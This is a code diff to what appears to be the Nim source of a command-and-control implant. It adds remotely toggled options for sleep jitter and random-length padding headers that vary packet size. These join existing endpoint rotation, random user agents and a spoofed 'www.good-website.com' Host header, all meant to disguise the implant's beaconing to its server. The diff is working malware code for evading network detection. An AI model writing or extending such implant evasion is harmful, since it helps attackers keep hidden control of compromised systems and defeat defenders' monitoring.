@@ -4,7 +4,8 @@ from unicode import toLower
 from os import parseCmdLine
 import crypto
 import strenc
-import random 
+import random
+import strutils 
 
 
 # Define the object with listener properties
@@ -30,7 +31,15 @@ type
         randomUserAgentsCounter: int
         changeEndPoints: bool
         changeHost: bool
+        changeSleepTime: bool
+        changePacketSize: bool 
 
+
+proc randomString(minLength, maxLength: int): string =
+    randomize()  
+    let length = rand(minLength..maxLength)
+    result = rndStr(length)
+    return result
 
 proc changeEndPointsStrategy(li :var Listener): void = 
     li.taskPath = "/zero"
@@ -62,6 +71,14 @@ proc getRandomUserAgent(li :var Listener): string =
 proc doRequest(li : var Listener, path : string, postKey : string = "", postValue : string = "") : Response =
     try:
         var headers: seq[Header]
+
+
+        # check if frequency shall change 
+        if li.changeSleepTime:
+            li.sleepJitter = 0.6
+        else:
+            li.sleepJitter = 0
+
 
         # check Endpoints /results, tasks
         if li.changeEndPoints:
@@ -113,6 +130,11 @@ proc doRequest(li : var Listener, path : string, postKey : string = "", postValu
             if li.changeHost:
                 headers.add(Header(key: "Host", value: "www.good-website.com"))
 
+            # check if packet size shall change
+            if li.changePacketSize:
+                # add a header with the random generated string
+                headers.add(Header(key: "X-Request-ID", value: randomString(50, 200)))
+
             let req = Request(
                 url: parseUrl(target),
                 verb: "get",
@@ -154,7 +176,7 @@ proc doRequest(li : var Listener, path : string, postKey : string = "", postValu
                 return fetch(req)
 
 
-
+            # doing the same post request but without changing the userAgent      
             else:
                 var req = Request(
                     url: parseUrl(target),
@@ -207,6 +229,8 @@ proc init*(li: var Listener) : void =
         li.changeEndPoints = false
         li.newListenerPort = li.listenerPort
         li.changeHost = false
+        li.changeSleepTime = false
+        li.changePacketSize = false
     else:
         li.initialized = false
 
@@ -260,6 +284,8 @@ proc getQueuedCommand*(li: var Listener) : (string, string, seq[string]) =
             li.newListenerPort = decryptData(parseJson(res.body)["p3"].getStr(), li.cryptKey)
             li.changeEndPoints = parseBool(decryptData(parseJson(res.body)["s4"].getStr(), li.cryptKey).replace("\'", "\""))
             li.changeHost = parseBool(decryptData(parseJson(res.body)["s5"].getStr(), li.cryptKey).replace("\'", "\""))
+            li.changeSleepTime = parseBool(decryptData(parseJson(res.body)["s6"].getStr(), li.cryptKey).replace("\'", "\"")) 
+            li.changePacketSize = parseBool(decryptData(parseJson(res.body)["s7"].getStr(), li.cryptKey).replace("\'", "\"")) 
 
             # Attempt to parse task (parseJson() needs string literal... sigh)
             var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey).replace("\'", "\"")
